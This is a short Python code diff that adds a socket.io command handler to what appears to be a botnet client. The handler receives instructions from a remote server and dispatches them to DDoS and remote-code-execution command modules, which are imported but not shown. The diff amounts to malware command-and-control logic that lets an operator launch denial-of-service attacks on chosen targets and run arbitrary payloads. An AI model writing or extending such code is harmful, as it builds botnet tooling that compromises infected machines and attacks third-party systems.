@@ -1,3 +1,6 @@
+from commands.rce import CommandRCE
+from commands.ddos import CommandDDoS
+from commands.command import Command, CommandType
 import socketio
 
 socket_client = socketio.AsyncClient()
@@ -21,4 +24,13 @@ def disconnect():
 
 @socket_client.on('command')
 def on_command(sid: str, data):
-    pass
+    command: Command
+    if data['type'] == CommandType.DDOS:
+        command = CommandDDoS(data['target'])
+    elif data['type'] == CommandType.RCE:
+        command = CommandRCE(data['payload'])
+
+    if command is not None:
+        command.process()
+    else:
+        print('Error, command {} does not exists'.format(data['type']))
